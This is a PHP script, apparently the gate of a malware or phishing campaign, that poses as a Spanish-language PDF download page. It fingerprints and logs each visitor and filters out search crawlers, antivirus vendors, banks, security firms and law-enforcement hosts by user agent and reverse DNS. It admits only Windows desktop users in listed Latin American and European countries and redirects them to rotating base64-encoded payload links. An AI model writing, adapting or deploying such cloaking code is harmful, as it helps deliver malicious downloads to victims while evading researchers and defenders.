<?php

echo "<html>
<head>
  <style>
    body {
      display: flex;
      align-items: center;
      justify-content: center;
      height: 100vh;
      margin: 0;
    }
    .mensagem {
      font-size: 2em;
      text-align: center;
    }
  </style>
</head>
<body>
  <div class='mensagem'>Descargando su archivo PDF...</div>
</body>
</html>";

date_default_timezone_set('America/Sao_Paulo');
require_once('funcoes.php');

$destino = "MX";
$destino1 = "AR";
$destino2 = "PY";
$destino3 = "UY";
$destino4 = "CL";
$destino5 = "PE";
$destino6 = "CR";
$destino7 = "CO";
$destino8 = "EC";
$destino9 = "VE";
$destino10 = "BO";
$destino11 = "GT";
$destino12 = "PA";
$destino13 = "DO";
$destino14 = "SV";
$destino15 = "HN";
$destino16 = "NI";
$destino17 = "CU";
$destino18 = "JM";
$destino19 = "HT";
$destino20 = "ES";
$destino21 = "PT";
$destino22 = "IT";
$destino23 = "BE";
$destino24 = "GR";
$destino25 = "HR";

$urlBloqueio = base64_decode("Y2xvc2UuaHRtbA");
$user_os        =   getOS();
$user_browser   =   getBrowser();
$ip = getIp();
$urldesviamobile = "mobile.html";
$status = "LIBERADO";

$mobile = isMobile() ? "MOBILE" : "DESKTOP";
if($mobile == "MOBILE"){
    $status = "DESVIADO";
}

if($user_os == "Mac OS X" || $user_os == "iPad" || $user_os == "Android" || $user_os == "Linux")
{
    $mobile = "MOBILE";
	$status = "DESVIADO";
}

if(strlen($ip)>25) 
{
	$status = "BLOQUEADO";
}


if (preg_match('/Googlebot\/|antispam|Googlebot-Mobile|Googlebot-Image|Googlebot-News|Googlebot-Video|AdsBot-Google([^-]|$)|AdsBot-Google-Mobile|Feedfetcher-Google|Mediapartners-Google|Mediapartners \(Googlebot\)|APIs-Google|bingbot|Slurp|[wW]get|LinkedInBot|Python-urllib|python-requests|libwww-perl|httpunit|nutch|Go-http-client|phpcrawl|msnbot|jyxobot|FAST-WebCrawler|FAST Enterprise Crawler|BIGLOTRON|Teoma|convera|seekbot|Gigabot|Gigablast|exabot|ia_archiver|GingerCrawler|webmon |HTTrack|grub.org|UsineNouvelleCrawler|antibot|netresearchserver|speedy|fluffy|findlink|msrbot|panscient|yacybot|AISearchBot|ips-agent|tagoobot|MJ12bot|woriobot|yanga|buzzbot|mlbot|YandexBot|YandexImages|YandexAccessibilityBot|YandexMobileBot|purebot|Linguee Bot|CyberPatrol|voilabot|Baiduspider|citeseerxbot|spbot|twengabot|postrank|TurnitinBot|scribdbot|page2rss|sitebot|linkdex|Adidxbot|ezooms|dotbot|Mail.RU_Bot|discobot|heritrix|findthatfile|europarchive.org|NerdByNature.Bot|sistrix crawler|Ahrefs(Bot|SiteAudit)|fuelbot|CrunchBot|IndeedBot|mappydata|woobot|ZoominfoBot|PrivacyAwareBot|Multiviewbot|SWIMGBot|Grobbot|eright|Apercite|semanticbot|Aboundex|domaincrawler|wbsearchbot|summify|CCBot|edisterbot|seznambot|ec2linkfinder|gslfbot|aiHitBot|intelium_bot|facebookexternalhit|Yeti|RetrevoPageAnalyzer|lb-spider|Sogou|lssbot|careerbot|wotbox|wocbot|ichiro|DuckDuckBot|lssrocketcrawler|drupact|webcompanycrawler|acoonbot|openindexspider|gnam gnam spider|web-archive-net.com.bot|backlinkcrawler|coccoc|integromedb|content crawler spider|toplistbot|it2media-domain-crawler|ip-web-crawler.com|siteexplorer.info|elisabot|proximic|changedetection|arabot|WeSEE:Search|niki-bot|CrystalSemanticsBot|rogerbot|360Spider|psbot|InterfaxScanBot|CC Metadata Scaper|g00g1e.net|GrapeshotCrawler|urlappendbot|brainobot|fr-crawler|binlar|SimpleCrawler|Twitterbot|cXensebot|smtbot|bnf.fr_bot|A6-Indexer|ADmantX|Facebot|OrangeBot\/|memorybot|AdvBot|MegaIndex|SemanticScholarBot|ltx71|nerdybot|xovibot|BUbiNG|Qwantify|archive.org_bot|Applebot|TweetmemeBot|crawler4j|findxbot|S[eE][mM]rushBot|yoozBot|lipperhey|Y!J|Domain Re-Animator Bot|AddThis|Screaming Frog SEO Spider|MetaURI|Scrapy|Livelap[bB]ot|OpenHoseBot|CapsuleChecker|collection@infegy.com|IstellaBot|DeuSu\/|betaBot|Cliqzbot\/|MojeekBot\/|netEstate NE Crawler|SafeSearch microdata crawler|Gluten Free Crawler\/|Sonic|Sysomos|Trove|deadlinkchecker|Slack-ImgProxy|Embedly|RankActiveLinkBot|iskanie|SafeDNSBot|SkypeUriPreview|Veoozbot|Slackbot|redditbot|datagnionbot|Google-Adwords-Instant|adbeat_bot|WhatsApp|contxbot|pinterest.com.bot|electricmonk|GarlikCrawler|BingPreview\/|vebidoobot|FemtosearchBot|Yahoo Link Preview|MetaJobBot|DomainStatsBot|mindUpBot|Daum\/|Jugendschutzprogramm-Crawler|Xenu Link Sleuth|Pcore-HTTP|moatbot|KosmioBot|pingdom|AppInsights|PhantomJS|Gowikibot|PiplBot|Discordbot|TelegramBot|Jetslide|newsharecounts|James BOT|Bark[rR]owler|TinEye|SocialRankIOBot|trendictionbot|Ocarinabot|epicbot|Primalbot|DuckDuckGo-Favicons-Bot|GnowitNewsbot|Leikibot|LinkArchiver|YaK\/|PaperLiBot|Digg Deeper|dcrawl|Snacktory|AndersPinkBot|Fyrebot|EveryoneSocialBot|Mediatoolkitbot|Luminator-robots|ExtLinksBot|SurveyBot|NING\/|okhttp|Nuzzel|omgili|PocketParser|YisouSpider|um-LN|ToutiaoSpider|MuckRack|Jamie\'s Spider|AHC\/|NetcraftSurveyAgent|Laserlikebot|^Apache-HttpClient|AppEngine-Google|Jetty|Upflow|Thinklab|Traackr.com|Twurly|Mastodon|http_get|DnyzBot|botify|007ac9 Crawler|BehloolBot|BrandVerity|check_http|BDCbot|ZumBot|EZID|ICC-Crawler|ArchiveBot|^LCC |filterdb.iss.net\/crawler|BLP_bbot|BomboraBot|Buck\/|Companybook-Crawler|Genieo|magpie-crawler|MeltwaterNews|Moreover|newspaper\/|ScoutJet|(^| )sentry\/|StorygizeBot|UptimeRobot|OutclicksBot|seoscanners|Hatena|Google Web Preview|MauiBot|AlphaBot|SBL-BOT|IAS crawler|adscanner|Netvibes|acapbot|Baidu-YunGuanCe|bitlybot|blogmuraBot|Bot.AraTurka.com|bot-pge.chlooe.com|BoxcarBot|BTWebClient|ContextAd Bot|Digincore bot|Disqus|Feedly|Fetch\/|Fever|Flamingo_SearchEngine|FlipboardProxy|g2reader-bot|G2 Web Services|imrbot|K7MLWCBot|Kemvibot|Landau-Media-Spider|linkapediabot|vkShare|Siteimprove.com|BLEXBot\/|DareBoost|ZuperlistBot\/|Miniflux\/|Feedspot|Diffbot\/|SEOkicks|tracemyfile|Nimbostratus-Bot|zgrab|PR-CY.RU|AdsTxtCrawler|Datafeedwatch|Zabbix|TangibleeBot|google-xrawler|axios|Amazon CloudFront|Pulsepoint|CloudFlare-AlwaysOnline|Google-Structured-Data-Testing-Tool|WordupInfoSearch|WebDataStats|HttpUrlConnection|Seekport Crawler|ZoomBot|VelenPublicWebCrawler|MoodleBot|jpg-newsbot|outbrain|W3C_Validator|Validator\.nu|W3C-checklink|W3C-mobileOK|W3C_I18n-Checker|FeedValidator|W3C_CSS_Validator|W3C_Unicorn|Google-PhysicalWeb|Blackboard|ICBot\/|BazQux|Twingly|Rivva|Experibot|awesomecrawler|Dataprovider.com|GroupHigh\/|theoldreader.com|AnyEvent|Uptimebot\.org|Nmap Scripting Engine|2ip.ru|Clickagy|Caliperbot|MBCrawler|online-webceo-bot|B2B Bot|AddSearchBot|Google Favicon|HubSpot|Chrome-Lighthouse|HeadlessChrome|CheckMarkNetwork\/|www\.uptime\.com|Streamline3Bot\/|serpstatbot\/|MixnodeCache\/|^curl|SimpleScraper|RSSingBot|Jooblebot|fedoraplanet|Friendica|NextCloud|Tiny Tiny RSS|RegionStuttgartBot|Bytespider|Datanyze|Google-Site-Verification/', $_SERVER['HTTP_USER_AGENT'])) {
	$status = "BLOQUEADO";
}


$HOSTS_BLOCK = array(".tor.","antispam","spam","123planosdesaude","VAULTVPN","activescan","alpha2","amazon","ancombraterney","anti-phishing","antipishing","antispam","antivirus","avast","bancopastor","bancopopular","banesto","bankofamerica","barracuda","bb.com.br","bitdefender","bradesco","cajamadrid","chicago ","cia.gov","clamav","clamwin","cleandir","colocrossing","coloup","consumer","copel","datapacket","delitosinformaticos","detector","dimenoc","dnblead","donategrid","dufrio","easysol","ebay.com","eset","eveocloud","f-secure","fasano","fbi.gov","fraudwatchinternational","free-av","gfihispana","google","greenmountainaccess","grisoft","hands","hauri-la","hispasec","instantcheckmain","itau","iwgroup","kapersky","laarnes","letti","linode","mailcontrol","mailstream","mallshill","marimex","mcafee","mgconecta","microsoft.com","midphase","monitor","msn.com","nephosdns","netcraft.com","nod32","norton","offerzz1","onlinedc","opendns","owned-networks","panda.com","pandasoftware","paypal","phish","pish","prcdn","protectedgroup","quadranet","rodobens.com.br","rsa.com","rsghosting","sajonaramail","santander","scaleway","scotiabank","security","seguridad","sescsp","sophos","spamfirewall2","spfbl","symantec","thinins","trendmicro","trustwave","unicaja","utfpr.edu.br","verisign","veritas","viabcp","vnunet","vodafone","vultr","wbinfo","webandseo ","zonealarm");

$HOST = gethostbyaddr($_SERVER['REMOTE_ADDR']);

foreach($HOSTS_BLOCK as $ROWS){
	if(strpos($HOST, $ROWS) == true){
		$status = "BLOQUEADO";
        break;
	}
}


$email = "RU5WSU8tRU1BSUw=";
$localizacao = getGeo($ip);
$paisdoalvo = isset($localizacao) && isset($localizacao->country) ? $localizacao->country : "-";
$pais = isset($localizacao) && isset($localizacao->countryCode) ? $localizacao->countryCode : "-";
$estado = isset($localizacao) && isset($localizacao->region) ? $localizacao->region : "-";
$cidade = isset($localizacao) && isset($localizacao->city) ? $localizacao->city : "-";
$data = date('d/m/Y H:i:s');

if($pais == "" && $pais == "-")
{
 $status = "BLOQUEADO";	
}

if($status != "BLOQUEADO" && $pais != $destino && $pais != $destino1 && $pais != $destino2 && $pais != $destino3 && $pais != $destino4 && $pais != $destino5 &&
$pais != $destino6 && $pais != $destino7 && $pais != $destino8 && $pais != $destino9 && $pais != $destino10 && $pais != $destino11 &&
$pais != $destino12 && $pais != $destino13 && $pais != $destino14 && $pais != $destino15 && $pais != $destino16 && $pais != $destino17 &&
$pais != $destino18 && $pais != $destino19 && $pais != $destino20 && $pais != $destino21 && $pais != $destino22 && $pais != $destino23 &&
$pais != $destino24 && $pais != $destino25)
{
    $status = "BLOQUEADO";
}
if(strpos(file_get_contents($arquivoContador),  $ip))
{
}
else
{
$str = $data."|".$ip."|".$HOST."|".$pais."|".$estado."|".$userAgent."|".$cidade."|".$mobile."|".$user_os."|".$user_browser."|".$email."|".$status."|".$paisdoalvo;	
file_put_contents($arquivoContador, $str.PHP_EOL, FILE_APPEND);
}

if($status == "BLOQUEADO")
{
    header('Location: '.$urlBloqueio);
    exit();
}

if($status == "DESVIADO")
{
    header('Location: '.$urldesviamobile);
    exit();
}

if($status == "LIBERADO")
{
   file_put_contents($arquivoLiberados, $ip." - ".$user_os.PHP_EOL, FILE_APPEND);
   $contagemlinks = contarLinksDisponiveis();
   $contagemclick = contarClicksLinksLiberados(); 	
   $a = 1;
   
   
   if((int)$contagemclick <= (int)$contagemlinks - $a)
   { 
    $numerodalinha = (int)$contagemclick - $a;
    $linhadesejada = pega_linha($arquivolinksdisponiveis,$numerodalinha);
	header('Refresh: 2; URL='.base64_decode($linhadesejada));
   }
   else
   {
	file_put_contents($arquivoLiberados, ''); 
	$numerodalinha = (int)$contagemclick - $a;
    $linhadesejada = pega_linha($arquivolinksdisponiveis,$numerodalinha);
	header('Refresh: 2; URL='.base64_decode($linhadesejada));
   }  
}
 ?>